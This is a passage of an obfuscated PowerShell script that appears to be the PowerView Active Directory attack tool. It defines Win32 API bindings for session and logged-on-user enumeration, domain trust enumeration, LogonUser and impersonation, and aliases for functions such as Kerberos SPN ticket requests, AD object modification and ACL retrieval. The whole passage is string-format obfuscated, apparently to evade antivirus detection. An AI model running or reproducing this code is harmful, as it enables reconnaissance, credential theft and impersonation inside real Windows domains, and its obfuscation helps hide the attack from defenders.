    ("{1}{3}{2}{0}{4}"-f'RY_GROU','APP','E','_QU','P')                 =   ("{1}{2}{0}{3}"-f'00','0','x40','0001')
    ("{0}{2}{1}{3}"-f 'ACCOU','T_T','N','YPE_MAX')                =   ("{1}{0}{2}"-f 'ff','0x7ffff','f')
}

${Gr`o`UpTYp`EE`NUm} = &("{0}{1}"-f'psenu','m') ${M`Od} ("{2}{3}{4}{1}{0}" -f'eEnum','.GroupTyp','Po','werV','iew') ("{0}{1}"-f'UInt','32') @{
    ("{2}{0}{1}{3}"-f'EATED_B','Y_SYSTE','CR','M')               =   ("{1}{0}{2}" -f'00','0x00000','1')
    ("{2}{0}{1}" -f 'A','L_SCOPE','GLOB')                    =   ("{1}{2}{0}"-f'2','0x000000','0')
    ("{1}{3}{4}{2}{0}" -f'E','DOMA','_SCOP','IN_LO','CAL')              =   ("{1}{2}{0}{3}"-f'0','0','x00','00004')
    ("{0}{2}{1}" -f 'UNIV','COPE','ERSAL_S')                 =   ("{0}{1}{2}"-f'0x00000','00','8')
    ("{3}{1}{0}{2}" -f 'S','A','IC','APP_B')                       =   ("{2}{0}{1}"-f'0000','10','0x00')
    ("{1}{0}{2}"-f'UER','APP_Q','Y')                       =   ("{1}{2}{0}" -f '0000020','0','x0')
    ("{0}{2}{1}" -f'SECU','ITY','R')                        =   ("{2}{1}{3}{0}"-f'0','8','0x','000000')
} -Bitfield

${UaceN`Um} = &("{1}{2}{0}"-f'um','pse','n') ${m`oD} ("{3}{1}{0}{2}"-f 'rV','we','iew.UACEnum','Po') ("{0}{1}"-f'U','Int32') @{
    ("{1}{0}{2}"-f 'P','SCRI','T')                          =   1
    ("{3}{1}{0}{2}"-f'ABL','CCOUNTDIS','E','A')                  =   2
    ("{0}{2}{4}{1}{3}" -f 'HOMEDIR','I','_RE','RED','QU')                =   8
    ("{0}{2}{1}" -f'L','KOUT','OC')                         =   16
    ("{3}{0}{1}{2}" -f 'S','SWD_NO','TREQD','PA')                  =   32
    ("{5}{3}{4}{2}{0}{1}"-f'C','HANGE','NT_','WD','_CA','PASS')              =   64
    ("{5}{6}{1}{3}{4}{2}{0}" -f'LLOWED','ED_TEXT_','A','PWD','_','EN','CRYPT')      =   128
    ("{4}{3}{1}{0}{2}" -f 'CCOU','PLICATE_A','NT','_DU','TEMP')          =   256
    ("{1}{4}{2}{0}{3}" -f 'O','N','CC','UNT','ORMAL_A')                  =   512
    ("{3}{4}{0}{1}{2}{5}"-f 'I','N_TR','UST_ACC','INTERD','OMA','OUNT')       =   2048
    ("{3}{4}{6}{0}{2}{1}{5}"-f'ION_TR','S','U','WO','RK','T_ACCOUNT','STAT')       =   4096
    ("{3}{2}{1}{0}" -f 'UNT','ACCO','ST_','SERVER_TRU')            =   8192
    ("{1}{0}{2}{4}{3}"-f 'EXPIRE','DONT_','_PASSW','RD','O')            =   65536
    ("{2}{3}{4}{1}{0}"-f '_ACCOUNT','LOGON','M','N','S_')               =   131072
    ("{3}{0}{2}{4}{1}" -f'C','D','ARD_REQUIR','SMART','E')              =   262144
    ("{0}{2}{1}{5}{6}{4}{3}" -f 'TRUS','E','T','N','GATIO','D_FOR_D','ELE')          =   524288
    ("{1}{3}{0}{2}"-f'TE','N','D','OT_DELEGA')                   =   1048576
    ("{0}{2}{1}" -f 'USE_DE','KEY_ONLY','S_')                =   2097152
    ("{3}{4}{0}{2}{1}"-f'EQ_P','UTH','REA','DON','T_R')                =   4194304
    ("{2}{0}{1}" -f'ORD','_EXPIRED','PASSW')                =   8388608
    ("{6}{1}{7}{2}{0}{5}{4}{3}" -f'FOR','D_TO_AU','_','ION','LEGAT','_DE','TRUSTE','TH')  =   16777216
    ("{0}{5}{1}{3}{2}{6}{7}{4}" -f 'PA','SE','S_','CRET','COUNT','RTIAL_','A','C')         =   67108864
} -Bitfield

${WTs`cONn`ECT`StATE} = &("{1}{0}" -f 'm','psenu') ${m`OD} ("{4}{2}{0}{1}{3}"-f'ON','NECTS','TS_C','TATE_CLASS','W') ("{1}{0}"-f 'nt16','UI') @{
    ("{1}{0}"-f 'e','Activ')       =    0
    ("{0}{2}{3}{1}"-f 'Co','d','n','necte')    =    1
    ("{1}{0}{2}" -f'ctQu','Conne','ery') =    2
    ("{1}{0}" -f'w','Shado')       =    3
    ("{1}{2}{3}{0}"-f'd','Disco','nnec','te') =    4
    ("{1}{0}"-f'dle','I')         =    5
    ("{1}{0}" -f 'en','List')       =    6
    ("{1}{0}"-f 'set','Re')        =    7
    ("{0}{1}" -f'Dow','n')         =    8
    ("{0}{1}" -f'I','nit')         =    9
}

${wT`s_sEssiO`N`_`inF`O_1} = &("{0}{1}{2}" -f'st','ruc','t') ${m`Od} ("{3}{4}{2}{5}{1}{0}"-f'o','onInf','w.R','Power','Vie','DPSessi') @{
    ("{2}{0}{1}"-f'nv','Id','ExecE') = &("{0}{1}"-f 'fie','ld') 0 ("{2}{0}{1}" -f 'Int','32','U')
    ("{1}{0}" -f'tate','S') = &("{1}{0}" -f 'd','fiel') 1 ${wTSco`Nn`ec`T`S`TATe}
    ("{0}{1}"-f'Sessio','nId') = &("{1}{0}"-f'ld','fie') 2 ("{0}{1}"-f 'UInt3','2')
    ("{3}{1}{2}{0}"-f 'nName','ess','io','pS') = &("{1}{0}" -f'eld','fi') 3 ("{1}{0}"-f 'ing','Str') -MarshalAs @(("{0}{1}" -f'LPWS','tr'))
    ("{2}{3}{1}{0}" -f'e','am','pHos','tN') = &("{1}{0}"-f'eld','fi') 4 ("{1}{0}"-f'ring','St') -MarshalAs @(("{1}{2}{0}"-f 'tr','LPW','S'))
    ("{2}{0}{1}"-f'serNam','e','pU') = &("{0}{1}"-f'fiel','d') 5 ("{2}{1}{0}"-f'g','rin','St') -MarshalAs @(("{0}{1}" -f'LPW','Str'))
    ("{2}{1}{0}"-f'nName','i','pDoma') = &("{1}{0}" -f'eld','fi') 6 ("{1}{0}"-f 'ing','Str') -MarshalAs @(("{1}{0}" -f 'PWStr','L'))
    ("{0}{2}{1}" -f'pFarm','ame','N') = &("{1}{0}" -f'ield','f') 7 ("{0}{1}" -f'Strin','g') -MarshalAs @(("{1}{0}" -f'r','LPWSt'))
}

${wts_`C`Lient_`Ad`drEss} = &("{0}{1}{2}" -f'str','uc','t') ${m`od} ("{1}{2}{0}{3}" -f'IEN','W','TS_CL','T_ADDRESS') @{
    ("{0}{1}{2}" -f 'Addres','sFa','mily') = &("{0}{1}"-f 'f','ield') 0 ("{0}{1}"-f 'UI','nt32')
    ("{1}{0}" -f'dress','Ad') = &("{1}{0}" -f'ield','f') 1 ("{1}{0}"-f'e[]','Byt') -MarshalAs @(("{3}{2}{1}{0}" -f 'y','lArra','a','ByV'), 20)
}

${s`H`A`R`e_InfO_1} = &("{1}{0}" -f'ruct','st') ${M`od} ("{1}{4}{0}{2}{3}"-f 'har','PowerV','eIn','fo','iew.S') @{
    ("{1}{0}"-f'ame','N') = &("{0}{1}"-f'fie','ld') 0 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{1}{0}"-f 'r','LPWSt'))
    ("{0}{1}" -f'T','ype') = &("{1}{0}"-f'eld','fi') 1 ("{2}{1}{0}" -f '2','Int3','U')
    ("{1}{0}" -f'ark','Rem') = &("{1}{0}"-f'eld','fi') 2 ("{2}{0}{1}" -f 'tr','ing','S') -MarshalAs @(("{1}{0}{2}"-f 'PWS','L','tr'))
}

${w`kSt`A_user_`iNf`O_1} = &("{1}{0}{2}"-f 'tru','s','ct') ${m`Od} ("{5}{1}{4}{6}{0}{2}{7}{3}"-f'View.Logge','o','d','UserInfo','we','P','r','On') @{
    ("{0}{1}{2}" -f'UserN','am','e') = &("{1}{0}" -f 'ield','f') 0 ("{1}{0}{2}"-f 'ri','St','ng') -MarshalAs @(("{0}{2}{1}" -f'L','WStr','P'))
    ("{3}{1}{2}{0}" -f 'n','g','onDomai','Lo') = &("{1}{0}" -f'eld','fi') 1 ("{1}{0}"-f'ring','St') -MarshalAs @(("{1}{0}{2}"-f 'PWSt','L','r'))
    ("{0}{1}{3}{2}" -f'Aut','hDoma','ns','i') = &("{1}{0}"-f 'eld','fi') 2 ("{0}{1}" -f'Str','ing') -MarshalAs @(("{0}{1}"-f'LPWS','tr'))
    ("{1}{2}{0}"-f 'r','LogonServ','e') = &("{1}{0}"-f'eld','fi') 3 ("{1}{0}{2}"-f'ri','St','ng') -MarshalAs @(("{0}{1}" -f'LPWS','tr'))
}

${SE`S`siOn`_InF`O_10} = &("{0}{1}"-f'struc','t') ${m`od} ("{0}{2}{5}{4}{3}{1}{6}"-f'P','ion','owerVi','ess','.S','ew','Info') @{
    ("{1}{0}" -f'e','CNam') = &("{1}{0}" -f'eld','fi') 0 ("{0}{1}{2}" -f'S','tri','ng') -MarshalAs @(("{0}{1}{2}" -f 'LPWS','t','r'))
    ("{1}{2}{0}" -f'e','UserN','am') = &("{0}{1}"-f'f','ield') 1 ("{1}{2}{0}"-f'ng','St','ri') -MarshalAs @(("{2}{0}{1}" -f'PWS','tr','L'))
    ("{0}{1}"-f'Tim','e') = &("{0}{1}" -f 'f','ield') 2 ("{2}{0}{1}" -f 'Int3','2','U')
    ("{1}{0}" -f'e','IdleTim') = &("{1}{0}"-f'ield','f') 3 ("{1}{0}{2}"-f 'nt','UI','32')
}

${siD_`NaM`E_UsE} = &("{2}{0}{1}"-f 'nu','m','pse') ${m`OD} ("{1}{2}{0}{3}"-f'_US','SID_NAM','E','E') ("{1}{0}{2}" -f'I','U','nt16') @{
    ("{1}{2}{0}" -f'r','S','idTypeUse')             = 1
    ("{2}{1}{3}{0}"-f 'Group','id','S','Type')            = 2
    ("{2}{1}{0}" -f'eDomain','p','SidTy')           = 3
    ("{2}{1}{3}{0}"-f'ias','eA','SidTyp','l')            = 4
    ("{3}{4}{1}{2}{0}{5}"-f'Gr','e','llKnown','Si','dTypeW','oup')   = 5
    ("{2}{5}{4}{3}{1}{0}"-f'ccount','A','SidType','ed','let','De')   = 6
    ("{0}{2}{1}"-f 'SidTypeInva','d','li')          = 7
    ("{0}{1}{2}{3}"-f 'Sid','TypeUnkn','o','wn')          = 8
    ("{0}{2}{1}{3}" -f 'SidT','mpute','ypeCo','r')         = 9
}

${l`ocALgro`Up_i`Nf`o`_1} = &("{1}{0}"-f 'truct','s') ${m`oD} ("{0}{1}{3}{2}{4}" -f 'L','OCA','ROUP_INFO_','LG','1') @{
    ("{3}{2}{1}{0}" -f '1_name','i','p','lgr') = &("{1}{0}"-f'ield','f') 0 ("{1}{0}"-f 'ng','Stri') -MarshalAs @(("{2}{0}{1}"-f 'W','Str','LP'))
    ("{0}{1}{2}{4}{3}" -f'lg','rpi1','_com','t','men') = &("{1}{0}" -f'ield','f') 1 ("{1}{0}" -f'g','Strin') -MarshalAs @(("{1}{0}"-f'WStr','LP'))
}

${LoC`Al`GROup`_MEmBERs`_inF`O`_2} = &("{1}{0}"-f't','struc') ${m`OD} ("{2}{1}{7}{3}{6}{5}{0}{4}" -f 'RS_I','C','LO','L','NFO_2','P_MEMBE','GROU','A') @{
    ("{1}{0}{2}"-f 'grm','l','i2_sid') = &("{0}{1}"-f 'f','ield') 0 ("{1}{0}"-f 'r','IntPt')
    ("{2}{1}{0}{3}" -f'id','s','lgrmi2_','usage') = &("{1}{0}" -f 'd','fiel') 1 ${s`ID`_`NaMe_USE}
    ("{2}{3}{5}{4}{1}{0}"-f'name','2_domainand','lg','r','i','m') = &("{1}{0}" -f'ld','fie') 2 ("{2}{0}{1}"-f 't','ring','S') -MarshalAs @(("{1}{0}" -f 'r','LPWSt'))
}

${DSd`O`mAiN`FlaG} = &("{0}{1}" -f 'pse','num') ${M`OD} ("{4}{0}{3}{2}{1}" -f'Dom','Flags','in.','a','Ds') ("{1}{0}"-f'nt32','UI') @{
    ("{1}{2}{0}" -f 'FOREST','I','N_')       = 1
    ("{3}{4}{2}{0}{1}" -f 'N','D','U','D','IRECT_OUTBO') = 2
    ("{2}{0}{1}" -f '_R','OOT','TREE')       = 4
    ("{1}{2}{0}" -f 'ARY','PR','IM')         = 8
    ("{1}{3}{0}{2}"-f'_','NAT','MODE','IVE')     = 16
    ("{3}{0}{2}{1}{4}" -f 'T_I','B','N','DIREC','OUND')  = 32
} -Bitfield
${DSdo`ma`iNtruS`T`TYPE} = &("{0}{1}" -f 'p','senum') ${m`Od} ("{2}{0}{4}{5}{3}{1}" -f 'in.','e','DsDoma','Typ','Tr','ust') ("{1}{0}" -f'32','UInt') @{
    ("{2}{0}{1}" -f 'WNLE','VEL','DO')   = 1
    ("{0}{2}{1}" -f'UPLEV','L','E')     = 2
    ("{1}{0}"-f'T','MI')         = 3
    ("{1}{0}" -f 'CE','D')         = 4
}
${DSD`omaiN`TrusT`At`T`RIb`UtES} = &("{0}{1}" -f 'psenu','m') ${M`oD} ("{5}{7}{3}{4}{2}{0}{1}{6}" -f'ru','stAt','.T','ai','n','Ds','tributes','Dom') ("{0}{1}" -f 'UI','nt32') @{
    ("{1}{2}{0}"-f 'VE','NON_TRAN','SITI')      = 1
    ("{1}{2}{0}" -f'VEL_ONLY','U','PLE')        = 2
    ("{0}{2}{1}" -f'FILT','DS','ER_SI')         = 4
    ("{5}{0}{3}{2}{1}{4}" -f'T_','TI','RANSI','T','VE','FORES')   = 8
    ("{4}{1}{3}{2}{0}"-f 'IZATION','SS_O','GAN','R','CRO')  = 16
    ("{1}{2}{0}"-f'T','WITHIN_','FORES')       = 32
    ("{2}{5}{1}{4}{3}{0}" -f'RNAL','_','TREAT_A','E','EXT','S')   = 64
}

${D`s_`d`omAIN_tRuStS} = &("{1}{0}"-f 'ruct','st') ${M`Od} ("{0}{4}{2}{1}{3}"-f'DS_DO','TR','AIN_','USTS','M') @{
    ("{4}{1}{2}{3}{5}{0}" -f 'inName','o','sD','o','Netbi','ma') = &("{0}{1}" -f'fi','eld') 0 ("{2}{0}{1}"-f 'tr','ing','S') -MarshalAs @(("{0}{1}{2}" -f 'LPW','S','tr'))
    ("{0}{2}{3}{1}" -f 'DnsDoma','e','inNa','m') = &("{0}{1}" -f'fiel','d') 1 ("{0}{2}{1}" -f'Str','ng','i') -MarshalAs @(("{1}{0}" -f 'r','LPWSt'))
    ("{1}{0}" -f's','Flag') = &("{0}{1}"-f'fiel','d') 2 ${dsDOma`iNF`lag}
    ("{1}{2}{0}" -f 'ndex','Pa','rentI') = &("{1}{0}"-f 'ld','fie') 3 ("{0}{1}"-f 'UInt3','2')
    ("{2}{1}{0}"-f 'pe','tTy','Trus') = &("{0}{1}"-f'f','ield') 4 ${dS`domaIn`Tr`USttYPe}
    ("{0}{3}{2}{1}{4}" -f'Trust','t','ibu','Attr','es') = &("{1}{0}"-f 'eld','fi') 5 ${ds`d`OmAIN`TruS`TatTR`I`But`eS}
    ("{1}{2}{0}"-f'd','Dom','ainSi') = &("{1}{0}"-f'eld','fi') 6 ("{0}{1}" -f'IntP','tr')
    ("{0}{2}{1}"-f'Domain','id','Gu') = &("{0}{1}"-f 'fiel','d') 7 ("{0}{1}"-f 'Gu','id')
}

${NeTR`Es`Ou`RCeW} = &("{0}{1}" -f'struc','t') ${M`Od} ("{2}{1}{3}{0}"-f'W','OURC','NETRES','E') @{
    ("{0}{1}" -f'd','wScope') =         &("{1}{0}"-f 'd','fiel') 0 ("{0}{2}{1}"-f 'UInt','2','3')
    ("{1}{0}"-f 'pe','dwTy') =          &("{0}{1}"-f 'fiel','d') 1 ("{1}{0}" -f '2','UInt3')
    ("{2}{0}{1}"-f'is','playType','dwD') =   &("{0}{1}" -f 'f','ield') 2 ("{2}{0}{1}" -f 'Int','32','U')
    ("{1}{0}" -f 'wUsage','d') =         &("{0}{1}"-f'fiel','d') 3 ("{0}{1}"-f'UI','nt32')
    ("{1}{2}{3}{0}"-f'ame','lp','L','ocalN') =     &("{1}{0}"-f 'ld','fie') 4 ("{1}{0}" -f'ring','St') -MarshalAs @(("{1}{0}"-f 'r','LPWSt'))
    ("{2}{0}{1}" -f'Remote','Name','lp') =    &("{1}{0}" -f 'd','fiel') 5 ("{0}{1}" -f'Strin','g') -MarshalAs @(("{2}{0}{1}" -f 't','r','LPWS'))
    ("{0}{1}{2}" -f'lpCom','me','nt') =       &("{1}{0}" -f'eld','fi') 6 ("{0}{1}"-f'St','ring') -MarshalAs @(("{0}{1}"-f'LP','WStr'))
    ("{2}{0}{1}"-f'o','vider','lpPr') =      &("{0}{1}" -f'fiel','d') 7 ("{1}{2}{0}"-f'g','Str','in') -MarshalAs @(("{0}{1}"-f'LPWSt','r'))
}

${Fu`NCTiONd`eFi`N`ItI`ons} = @(
    (&("{0}{1}" -f'fun','c') ("{1}{2}{0}"-f'2','netap','i3') ("{0}{1}{2}"-f 'NetS','hareE','num') ([Int]) @([String], [Int],  ( &("{0}{1}"-f'iT','EM')  ('vari'+'abl'+'E:'+'HD'+'Icu'))."vA`lUe".("{4}{2}{1}{0}{3}"-f'Re','eBy','ak','fType','M').Invoke(), [Int],  (  &('Gi') ('VarIA'+'bl'+'E'+':Hi1'+'ZUK')  )."vAL`Ue".("{3}{2}{1}{0}" -f'efType','R','keBy','Ma').Invoke(),   (&("{1}{0}" -f'EM','it') ("{3}{1}{4}{0}{2}"-f'HI1zU','AB','K','VAri','Le:'))."v`ALUe".("{1}{0}{3}{2}"-f'keByRefT','Ma','e','yp').Invoke(),  (&("{1}{2}{0}" -f'aBle','v','arI') ('Hi1Zu'+'k')  )."V`ALue".("{2}{1}{0}" -f'fType','ByRe','Make').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{2}{0}{1}"-f 'a','pi32','net') ("{0}{2}{3}{1}{4}" -f 'NetWks','r','taU','se','Enum') ([Int]) @([String], [Int],  ( &('GI')  ("{2}{3}{1}{0}"-f 'u','e:HdiC','vaRi','abL') )."v`AlUE".("{2}{0}{1}" -f'fTy','pe','MakeByRe').Invoke(), [Int],  (  &("{1}{0}" -f 'iR','D') ("{1}{2}{0}{3}"-f '1ZU','vARiaBLe',':hi','K') )."val`Ue".("{2}{0}{1}"-f 'keByR','efType','Ma').Invoke(),   (  &("{0}{1}{2}" -f 'Var','IaBL','e') ('Hi1'+'zu'+'K') -valuEoN ).("{2}{4}{0}{1}{3}"-f'eB','yRefTyp','Ma','e','k').Invoke(),  ${HI1`Z`UK}.("{2}{1}{0}{3}" -f 'yRefT','akeB','M','ype').Invoke())),
    (&("{1}{0}"-f'nc','fu') ("{2}{1}{0}"-f '2','pi3','neta') ("{3}{1}{0}{4}{2}"-f'SessionE','et','um','N','n') ([Int]) @([String], [String], [String], [Int],  ${HdI`CU}.("{0}{1}{2}" -f 'MakeB','yRefTyp','e').Invoke(), [Int],  (  &("{1}{0}" -f'teM','Get-I')  ('VA'+'RiAbLE'+':h'+'I1ZU'+'k'))."val`UE".("{2}{3}{0}{1}"-f 'yRef','Type','M','akeB').Invoke(),   ${hi`1Z`Uk}.("{0}{1}{4}{3}{2}"-f'Ma','k','pe','RefTy','eBy').Invoke(),   ${hI1Z`Uk}.("{2}{0}{1}" -f'y','pe','MakeByRefT').Invoke())),
    (&("{0}{1}" -f 'f','unc') ("{1}{2}{0}"-f'i32','n','etap') ("{2}{4}{1}{3}{0}" -f'um','Local','Ne','GroupEn','t') ([Int]) @([String], [Int],  (&("{1}{2}{0}" -f 'aBLE','vA','Ri') ("{1}{0}"-f'U','HdIC')  -ValueoN  ).("{3}{2}{1}{0}"-f 'pe','efTy','ByR','Make').Invoke(), [Int],   ( &("{0}{1}"-f'G','Ci')  ("{1}{3}{2}{0}{4}"-f'1','vA','i','rIABLE:h','zuk')  )."Va`lue".("{0}{3}{2}{1}" -f'MakeB','pe','efTy','yR').Invoke(),  ( &("{1}{0}{2}" -f 'L','variAB','e') ("{1}{0}" -f'i1ZUK','H') )."vA`lue".("{2}{1}{3}{0}" -f'fType','akeB','M','yRe').Invoke(),  ${h`I1`ZUK}.("{1}{2}{0}"-f'e','MakeB','yRefTyp').Invoke())),
    (&("{0}{1}" -f 'fun','c') ("{0}{2}{1}" -f'netap','2','i3') ("{4}{0}{2}{3}{1}{6}{5}" -f 'calGrou','M','p','Get','NetLo','ers','emb') ([Int]) @([String], [String], [Int],  ( &("{1}{0}" -f 'i','gC')  ("{3}{2}{1}{0}"-f 'le:hDicU','iAB','Ar','v') )."V`Alue".("{2}{1}{0}"-f'yRefType','eB','Mak').Invoke(), [Int],   (  &("{1}{0}"-f'T-ITem','ge')  ('V'+'aRIa'+'Bl'+'E:hi1ZuK')  )."v`ALue".("{3}{0}{2}{1}"-f'k','yRefType','eB','Ma').Invoke(),   ( &("{1}{2}{0}" -f'BlE','GE','T-vaRIA')  ("{0}{1}"-f'Hi1','zuk')  -va).("{1}{2}{0}" -f'pe','MakeByRef','Ty').Invoke(),   (  &('LS')  ("{2}{0}{3}{4}{1}"-f'a','lE:hi1zUk','V','rIA','b'))."VA`LUE".("{0}{2}{1}" -f'MakeByRe','Type','f').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{2}{1}{0}" -f'api32','t','ne') ("{3}{4}{1}{0}{2}" -f'a','N','me','DsG','etSite') ([Int]) @([String],   (&("{2}{0}{3}{1}"-f'Et','E','G','-varIAbl')  ('hd'+'icU')  -VaLuE).("{1}{0}{2}" -f'ef','MakeByR','Type').Invoke())),
    (&("{1}{0}" -f'unc','f') ("{2}{1}{0}" -f '2','i3','netap') ("{5}{4}{3}{6}{1}{2}{0}" -f 'rusts','ain','T','r','nume','DsE','ateDom') ([Int]) @([String], [UInt32],  ( &("{0}{1}" -f 'V','ARIaBLe')  ('HDi'+'cu') -VALUEO ).("{0}{4}{1}{3}{2}" -f 'M','keB','RefType','y','a').Invoke(),  ${H`Di`cU}.("{1}{2}{3}{0}"-f'Type','Ma','keByRe','f').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{0}{1}"-f 'netap','i32') ("{3}{0}{2}{1}" -f'uf','erFree','f','NetApiB') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f 'fun','c') ("{0}{1}"-f'a','dvapi32') ("{3}{0}{4}{2}{1}" -f 'nvertS','id','tringS','Co','idToS') ([Int]) @([IntPtr],   ${zT`5x}.("{0}{1}{2}"-f'Mak','eB','yRefType').Invoke()) -SetLastError),
    (&("{0}{1}" -f 'fu','nc') ("{1}{0}{2}" -f 'api','adv','32') ("{1}{0}{3}{2}" -f'M','OpenSC','nagerW','a') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{1}{0}" -f 'nc','fu') ("{2}{0}{1}" -f 'dva','pi32','a') ("{2}{3}{0}{4}{1}" -f'ose','andle','C','l','ServiceH') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f'fun','c') ("{1}{2}{0}" -f'i32','adva','p') ("{1}{0}{2}"-f'onUse','Log','r') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   ${H`DiCu}.("{1}{3}{0}{2}"-f 'efTy','Make','pe','ByR').Invoke()) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}" -f'i32','advap') ("{1}{0}{4}{2}{3}" -f'onate','Impers','ge','dOnUser','Log') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{1}{0}" -f'nc','fu') ("{0}{2}{1}" -f'ad','32','vapi') ("{1}{2}{0}{3}"-f 'tT','Reve','r','oSelf') ([Bool]) @() -SetLastError),
    (&("{1}{0}"-f'unc','f') ("{2}{1}{0}"-f 'api32','ts','w') ("{2}{4}{1}{0}{3}"-f'erE','rv','WT','x','SOpenSe') ([IntPtr]) @([String])),
    (&("{1}{0}" -f'c','fun') ("{1}{0}" -f'2','wtsapi3') ("{3}{0}{4}{2}{1}" -f 'SE','eSessionsEx','rat','WT','nume') ([Int]) @([IntPtr],  ${hi1`ZUK}.("{2}{1}{0}" -f'pe','RefTy','MakeBy').Invoke(), [Int],  ${hD`i`cU}.("{0}{1}{2}" -f'M','akeBy','RefType').Invoke(),   ( &("{3}{2}{0}{1}" -f'RIAbl','e','a','gET-v')  ("hI1"+"zUK")  -vaLU ).("{2}{3}{1}{0}" -f'e','RefTyp','Make','By').Invoke()) -SetLastError),
    (&("{1}{0}"-f'nc','fu') ("{1}{0}" -f 'api32','wts') ("{1}{7}{3}{6}{2}{0}{5}{4}" -f 'format','W','sionIn','SQueryS','on','i','es','T') ([Int]) @([IntPtr], [Int], [Int],  ( &("{0}{1}{3}{2}"-f'ge','T-VAR','e','iabl')  ('hdi'+'CU') -vA  ).("{3}{0}{2}{1}"-f 'akeB','fType','yRe','M').Invoke(),   ${Hi1Z`UK}.("{0}{2}{1}{3}"-f'Ma','efTy','keByR','pe').Invoke()) -SetLastError),
    (&("{1}{0}" -f'c','fun') ("{2}{1}{0}"-f '32','api','wts') ("{1}{0}{2}{3}" -f'T','W','SFreeMemory','Ex') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{1}{0}"-f'c','fun') ("{0}{1}" -f 'wts','api32') ("{0}{3}{1}{2}"-f'WTSFr','M','emory','ee') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'f','unc') ("{0}{1}"-f'wtsap','i32') ("{2}{0}{1}"-f'eSe','rver','WTSClos') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f 'f','unc') ("{1}{0}"-f 'pr','M') ("{4}{3}{0}{2}{1}" -f 'ddCo','ction2W','nne','etA','WN') ([Int]) @(${netre`S`OURC`EW}, [String], [String], [UInt32])),
    (&("{0}{1}"-f 'fun','c') ("{0}{1}" -f 'M','pr') ("{1}{0}{3}{2}{4}"-f'tCancel','WNe','ct','Conne','ion2') ([Int]) @([String], [Int], [Bool])),
    (&("{1}{0}"-f 'nc','fu') ("{0}{2}{1}"-f 'k','el32','ern') ("{2}{0}{1}" -f 'loseH','andle','C') ([Bool]) @([IntPtr]) -SetLastError)
)

${t`ypEs} = ${FUnct`iO`N`DEF`INiTiO`NS} | &("{1}{0}{3}{2}"-f '-Win3','Add','Type','2') -Module ${m`Od} -Namespace ("{1}{0}" -f 'n32','Wi')
${neTAp`I32} = ${TY`pES}[("{0}{1}" -f 'netapi','32')]
${AD`Vap`I32} = ${TYP`ES}[("{1}{0}{2}" -f'dv','a','api32')]
${WTsa`Pi`32} = ${TYp`eS}[("{0}{1}" -f 'w','tsapi32')]
${M`PR} = ${TYp`Es}['Mpr']
${KE`RNe`l32} = ${T`Ypes}[("{1}{0}{2}" -f'r','ke','nel32')]

&("{1}{2}{0}" -f 'ias','S','et-Al') ("{1}{0}{2}"-f'ddre','Get-IPA','ss') ("{2}{4}{0}{5}{3}{1}" -f 'e-I','s','Res','res','olv','PAdd')
&("{0}{2}{1}"-f 'Se','ias','t-Al') ("{1}{0}{2}{3}" -f 'ver','Con','t-NameT','oSid') ("{1}{0}{2}"-f 'onvert','C','To-SID')
&("{2}{1}{0}" -f 'as','-Ali','Set') ("{0}{1}{2}{4}{3}" -f'Conver','t','-','me','SidToNa') ("{3}{1}{0}{4}{2}" -f 't','onver','-SID','C','From')
&("{3}{0}{1}{2}"-f'-A','li','as','Set') ("{2}{4}{5}{3}{0}{1}"-f 'ke','t','Reque','SPNTic','s','t-') ("{4}{2}{3}{1}{0}"-f't','cke','t','-DomainSPNTi','Ge')
&("{1}{0}{2}" -f '-Alia','Set','s') ("{2}{3}{0}{1}"-f'-DNSZ','one','Ge','t') ("{3}{1}{4}{2}{0}" -f 'Zone','-Domai','NS','Get','nD')
&("{3}{2}{1}{0}"-f 's','-Alia','t','Se') ("{2}{4}{3}{0}{1}" -f 'N','SRecord','Get','D','-') ("{2}{3}{0}{4}{1}" -f 'Do','d','G','et-','mainDNSRecor')
&("{2}{1}{0}" -f 's','-Alia','Set') ("{3}{1}{2}{0}"-f'in','m','a','Get-NetDo') ("{2}{3}{1}{0}"-f 'n','t-Domai','G','e')
&("{1}{2}{3}{0}" -f'ias','Set-','A','l') ("{0}{5}{4}{1}{3}{2}{6}"-f 'G','nCon','ol','tr','etDomai','et-N','ler') ("{3}{1}{2}{0}" -f'inController','et','-Doma','G')
&("{0}{1}{2}"-f 'Set-A','l','ias') ("{0}{4}{3}{2}{1}" -f'Ge','st','e','NetFor','t-') ("{0}{1}{2}"-f 'G','et-F','orest')
&("{1}{0}{2}" -f '-','Set','Alias') ("{0}{1}{3}{2}"-f 'Get','-N','Domain','etForest') ("{2}{1}{0}{3}" -f 'e','or','Get-F','stDomain')
&("{0}{1}{2}{3}"-f'Set','-','Alia','s') ("{2}{3}{1}{4}{0}"-f'og','Cata','Get-NetF','orest','l') ("{1}{2}{0}{5}{4}{3}"-f'r','Get','-Fo','tGlobalCatalog','s','e')
&("{0}{1}{2}"-f'S','e','t-Alias') ("{2}{1}{0}" -f 'User','et','Get-N') ("{1}{4}{3}{0}{2}" -f 'Use','Ge','r','in','t-Doma')
&("{0}{2}{1}" -f 'Set-Al','as','i') ("{0}{3}{1}{2}" -f 'Ge','serEven','t','t-U') ("{2}{3}{1}{0}"-f 'Event','r','Get-D','omainUse')
&("{1}{2}{0}" -f '-Alias','S','et') ("{2}{1}{0}{3}" -f'mput','NetCo','Get-','er') ("{5}{4}{1}{3}{2}{0}"-f 'r','inC','pute','om','t-Doma','Ge')
&("{1}{2}{3}{0}"-f 's','Set-','A','lia') ("{0}{2}{1}{3}" -f 'Ge','Obj','t-AD','ect') ("{0}{2}{3}{1}"-f'Get-Do','ect','ma','inObj')
&("{0}{3}{2}{1}"-f 'Set','s','Alia','-') ("{1}{0}{2}" -f'j','Set-ADOb','ect') ("{0}{2}{1}" -f 'Set-Domai','bject','nO')
&("{0}{2}{1}"-f'Set','ias','-Al') ("{1}{2}{0}{3}"-f 'ect','Ge','t-Obj','Acl') ("{1}{0}{4}{3}{2}"-f 'n','Get-Domai','jectAcl','b','O')
